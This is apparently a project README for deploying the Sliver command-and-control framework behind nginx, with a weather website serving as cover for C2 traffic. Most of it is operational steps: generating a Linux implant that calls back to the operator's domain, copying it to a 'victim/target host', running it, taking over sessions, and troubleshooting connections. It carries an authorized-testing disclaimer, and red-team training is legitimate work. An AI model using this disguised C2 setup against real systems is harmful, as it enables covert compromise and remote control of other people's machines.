# Sliver C2 Training Environment

A Docker Compose deployment showcasing the Sliver C2 framework for cybersecurity training and demonstration purposes. This environment includes a weather website as a cover application, nginx as a reverse proxy, and Sliver C2 server for command and control operations.

## Overview

This project demonstrates how Sliver C2 can be deployed alongside legitimate web services to provide a realistic training environment for cybersecurity professionals. The setup includes:

- **Nginx**: Reverse proxy handling HTTPS termination and routing
- **Weather Site**: Legitimate-looking weather application serving as a cover
- **Sliver C2**: Command and control framework for adversary simulation

## Architecture

```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │ HTTPS (443)
       ▼
┌─────────────┐
│   Nginx     │ (Reverse Proxy)
│  Port 80/443│
└──────┬──────┘
       │
       ├──────► Weather App (Port 5000) - /weather/
       │
       └──────► Sliver C2 (Port 8080) - /api/current/
```

## Prerequisites

- Docker and Docker Compose installed
- Open ports 80 and 443 on your host (or configure custom ports)
- SSL certificates (self-signed certificates work for testing)
- Domain name or IP address for your deployment

## Quick Start

### 1. Clone and Navigate

```bash
git clone https://github.com/JongoDB/sliver-weather.git
cd sliver-weather
```

### 2. Configure Environment Variables

Copy the environment template and configure it with your values:

```bash
cp env.template .env
```

Edit `.env` with your preferred editor and set the following required variables:

```bash
# Required: Your domain or IP address
DOMAIN=your-domain-or-ip.com

# SSL certificate names (will default to ${DOMAIN}.crt and ${DOMAIN}.key)
SSL_CERT_NAME=${DOMAIN}.crt
SSL_KEY_NAME=${DOMAIN}.key

# Optional: Customize ports, paths, etc.
# See env.template for all available options
```

**Important**: The `.env` file is gitignored and will not be committed to the repository. Each user must create their own `.env` file from the template.

### 3. SSL Certificate Setup

Generate SSL certificates matching your `DOMAIN` value:

```bash
mkdir -p nginx/certs
cd nginx/certs
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout ${DOMAIN}.key \
  -out ${DOMAIN}.crt \
  -subj "/CN=${DOMAIN}"
```

**Note**: Replace `${DOMAIN}` with your actual domain or IP address, or use the value from your `.env` file.

Alternatively, if you're using a domain, you can use Let's Encrypt or other certificate authorities.

### 4. Start the Services

**Important**: Make sure you have created your `.env` file before starting services. The nginx container uses environment variables to configure itself, and missing variables will cause startup failures.

```bash
docker compose up -d --build
```

The `--build` flag ensures containers are rebuilt with the latest configuration. This will:
- Build the nginx, weather, and sliver containers
- Substitute environment variables in nginx configuration at startup
- Start all services

**Note**: If you change your `.env` file after containers are built, you must rebuild the nginx container:
```bash
docker compose build nginx
docker compose up -d
```

**Certificate File Naming**: Ensure your SSL certificate files in `nginx/certs/` match the names specified in your `.env` file:
- Certificate file: `${SSL_CERT_NAME}` (default: `${DOMAIN}.crt`)
- Private key file: `${SSL_KEY_NAME}` (default: `${DOMAIN}.key`)

### 5. Access Sliver Server

```bash
docker compose exec -it sliver /bin/bash
```

### 6. Start Sliver Server

Inside the container:

```bash
/opt/sliver-server
```

### 7. Generate an Implant

In the Sliver console, generate a Linux implant. **Note**: You must use your actual domain/IP address - environment variables don't work in the Sliver console.

Replace `your-domain-or-ip.com` with your actual domain or IP from your `.env` file:

```bash
generate --http https://your-domain-or-ip.com:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
```

**Example** (if your DOMAIN is `example.com`):
```bash
generate --http https://example.com:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds
```

The implant will be saved to `/home/sliver/builds` inside the container, which is mounted to `./builds` on your host.

### 8. Start HTTP Listener

Start the HTTP listener. **Note**: Use the actual port number (default: 8080) - environment variables don't work in the Sliver console:

```bash
http --lport 8080 --lhost 0.0.0.0
```

**Note**: The port number (8080) should match `SLIVER_HTTP_PORT` from your `.env` file (default is 8080).

### 9. Deploy and Execute the Implant

After generating the implant, you need to:

1. **Copy the implant to your victim/target host**:
   ```bash
   # From your host machine
   scp builds/your_implant_name target_host:/tmp/
   # Or use any other method (HTTP server, USB, etc.)
   ```

2. **Execute the implant on the target host**:
   ```bash
   # On the target host
   /tmp/your_implant_name
   ```

3. **Check for active sessions** in the Sliver console:
   ```bash
   sessions
   ```

4. **Interact with a session**:
   ```bash
   use <session-id>
   ```

**Important**: The implant must be executed on the target host for it to establish a connection back to your Sliver C2 server. The implant will attempt to connect to the URL you specified during generation.

## Usage

### Accessing Services

All URLs use your configured `DOMAIN` from the `.env` file:

- **Weather App**: `https://${DOMAIN}/weather/`
- **Weather API**: `https://${DOMAIN}/api/weather?q=<location>`
- **Sliver C2 Endpoint**: `https://${DOMAIN}${SLIVER_C2_PATH}` (default: `/api/current/`)

### Building Implants

Implants are saved to the `builds/` directory, which is mounted as a volume. You can access them from the host at:

```bash
ls -la builds/
```

### Viewing Logs

```bash
# All services
docker compose logs -f

# Specific service
docker compose logs -f nginx
docker compose logs -f weather
docker compose logs -f sliver
```

### Stopping Services

```bash
docker compose down
```

### Cleaning Up

To remove all containers, networks, and volumes:

```bash
docker compose down -v
```

## Configuration

### Environment Variables

The project uses environment variables for universal configuration. All configuration is done through the `.env` file:

- **DOMAIN**: Your domain or IP address (required)
- **SSL_CERT_NAME**: SSL certificate filename (defaults to `${DOMAIN}.crt`)
- **SSL_KEY_NAME**: SSL private key filename (defaults to `${DOMAIN}.key`)
- **SLIVER_HTTP_PORT**: Internal Sliver HTTP listener port (default: 8080)
- **SLIVER_C2_PATH**: C2 endpoint path (default: `/api/current/`)
- **NGINX_HTTP_PORT**: External HTTP port (default: 80)
- **NGINX_HTTPS_PORT**: External HTTPS port (default: 443)
- **NETWORK_NAME**: Docker network name (default: `demo_net`)
- **SLIVER_CONFIG_DIR**: Path to Sliver config on host (default: `${HOME}/.sliver`)
- **BUILDS_DIR**: Path to builds directory (default: `./builds`)

See `env.template` for all available options and descriptions.

### Nginx

The nginx configuration template is located at `nginx/nginx.conf.template`. Environment variables are substituted at container startup:

- HTTP to HTTPS redirect on port 80
- SSL/TLS configuration for port 443
- Routing rules for weather app and Sliver C2
- Server name and certificate paths use `${DOMAIN}` and SSL certificate variables

### Docker Compose

The `docker-compose.yml` file reads from `.env` and defines:

- **nginx**: Builds custom image with envsubst, exposes configured HTTP/HTTPS ports
- **weather**: Weather application service
- **sliver**: Sliver C2 server with volumes for config and builds

All services use the `.env` file for configuration. The nginx service uses an entrypoint script that substitutes environment variables in the nginx configuration template at startup.

### Volumes

- `~/.sliver`: Sliver configuration and certificates
- `./builds`: Generated implant binaries

## Security Considerations

⚠️ **This is a training/demonstration environment. Do not deploy in production without proper security hardening.**

1. **SSL Certificates**: Use proper certificates, not self-signed for production
2. **Network Isolation**: Consider running in an isolated network
3. **Access Control**: Limit access to the Sliver server
4. **Logging**: Monitor and log all activities
5. **Firewall**: Restrict access to necessary ports only

## Troubleshooting

### Cannot connect to Sliver

- Verify the HTTP listener is running: `http --lport 8080 --lhost 0.0.0.0`
- Check nginx logs: `docker compose logs nginx`
- Verify routing in nginx.conf matches your implant URL

### SSL Certificate Errors

- Ensure certificates are in `nginx/certs/` directory
- Check certificate file permissions (should be readable by nginx user)
- Verify certificate file names match `${SSL_CERT_NAME}` and `${SSL_KEY_NAME}` from your `.env` file
- Ensure the certificate Common Name (CN) matches your `DOMAIN` value
- If you see "No such file or directory" errors, check that:
  - Your `.env` file exists and has `DOMAIN` set
  - Certificate filenames in `nginx/certs/` match `SSL_CERT_NAME` and `SSL_KEY_NAME` from `.env`
  - You've rebuilt the nginx container after creating/updating `.env`: `docker compose build nginx`

### Implant Not Connecting

- Verify the URL in the `generate` command matches your actual `DOMAIN` (use the actual value, not `${DOMAIN}`)
- Check that the `SLIVER_C2_PATH` matches the nginx routing configuration
- Verify nginx is routing the C2 path correctly (check nginx logs)
- Ensure the HTTP listener is active in Sliver (`http --lport 8080 --lhost 0.0.0.0`)
- Confirm the listener port matches `SLIVER_HTTP_PORT` from your `.env` file (default: 8080)
- Ensure the implant has been executed on the target host
- Check firewall rules on both the C2 server and target host
- Verify the implant can reach your C2 server's IP/domain on port 443

### Port Conflicts

- Check if ports 80 or 443 are already in use: `sudo netstat -tulpn | grep -E ':(80|443)'`
- Modify port mappings in docker-compose.yml if needed

## Project Structure

```
sliver-weather/
├── docker-compose.yml      # Main orchestration file
├── env.template            # Environment variables template
├── .env                    # Your local environment config (gitignored)
├── .gitignore              # Git ignore rules
├── nginx/
│   ├── nginx.conf.template # Nginx configuration template
│   ├── docker-entrypoint.sh # Entrypoint for env substitution
│   ├── certs/              # SSL certificates (gitignored)
│   └── Dockerfile          # Nginx Dockerfile
├── weather/
│   ├── Dockerfile          # Weather app Dockerfile
│   ├── server.js           # Weather API server
│   ├── package.json        # Node.js dependencies
│   └── public/             # Frontend files
├── sliver/
│   ├── Dockerfile          # Sliver Dockerfile
│   └── docker-entrypoint.sh # Entrypoint script
├── builds/                 # Generated implants (gitignored, created at runtime)
└── README.md              # This file
```

## Contributing

This is a training/demonstration project. Contributions and improvements are welcome!

## License

Please ensure compliance with local laws and regulations when using C2 frameworks. This project is for educational and authorized security testing purposes only.

## References

- [Sliver Framework](https://github.com/BishopFox/sliver)
- [Nginx Documentation](https://nginx.org/en/docs/)
- [Docker Compose Documentation](https://docs.docker.com/compose/)

## Support

For issues specific to:
- **Sliver**: Check the [Sliver documentation](https://github.com/BishopFox/sliver/wiki)
- **Docker**: Check Docker and Docker Compose logs
- **Nginx**: Check nginx logs and configuration syntax

---

**Disclaimer**: This tool is intended for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Use responsibly and only in environments you own or have explicit permission to test.

